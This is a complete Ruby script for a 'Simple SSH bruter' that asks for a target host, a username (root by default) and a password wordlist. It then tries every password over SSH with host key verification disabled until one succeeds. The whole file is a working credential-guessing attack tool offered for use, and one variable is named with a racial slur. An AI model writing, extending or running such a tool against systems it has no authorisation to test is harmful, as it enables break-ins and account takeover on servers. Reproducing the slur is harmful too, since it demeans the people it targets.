require 'net/ssh'

puts """
 ██████╗███████╗██╗  ██╗███████╗██████╗    ██████╗ ██████╗██╗  ██╗
██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔══██╗  ██╔════╝██╔════╝██║  ██║
╚█████╗ █████╗   ╚███╔╝ █████╗  ██████╔╝  ╚█████╗ ╚█████╗ ███████║
 ╚═══██╗██╔══╝   ██╔██╗ ██╔══╝  ██╔══██╗   ╚═══██╗ ╚═══██╗██╔══██║
██████╔╝███████╗██╔╝╚██╗███████╗██║  ██║  ██████╔╝██████╔╝██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
                                        Simple SSH bruter, made by komodo.
"""
def main
    begin
        print "[+] host: "
        host = gets.chomp

        print "[?] user: 'root', change it? y/n "
        nigga = gets.chomp
        if nigga == "y"
            print "[+] user: "
            user = gets.chomp
        elsif nigga == "n"
            user = "root"
        end

        print "[+] wordlist: "
        wordlist = gets.chomp
        puts "\n"
        sex = File.open(wordlist)
        magik = sex.map {|x| x.chomp}
        magik.each do |pass|
            begin
                Net::SSH.start(host, user, password: pass, :auth_methods => ["password"], 
                    :port => 22, :verify_host_key => :never,
                    :non_interactive => true, :timeout => 5) do |ssh|
                    print ssh
                    puts "\n[!] Password found! #{pass}"
                    break
                end
            rescue Net::SSH::AuthenticationFailed => no
                puts "\r#{no}, password '#{pass}'"
                puts "\n"
            rescue Net::SSH::Timeout
                puts "Error: #{host} has disconnected"
            rescue Errno::ECONNREFUSED
                puts "Error: connection refused."
            rescue Net::SSH::ConnectionTimeout
                puts "Error: #{host} isn't alive."
            rescue Net::SSH::Authentication::DisallowedMethod
                puts "Error: #{host} disallow the password authentication method."
            end     
        end
    rescue => exception
        puts "[-] ERROR"
        print exception
        puts "\n"
    end
end

print main
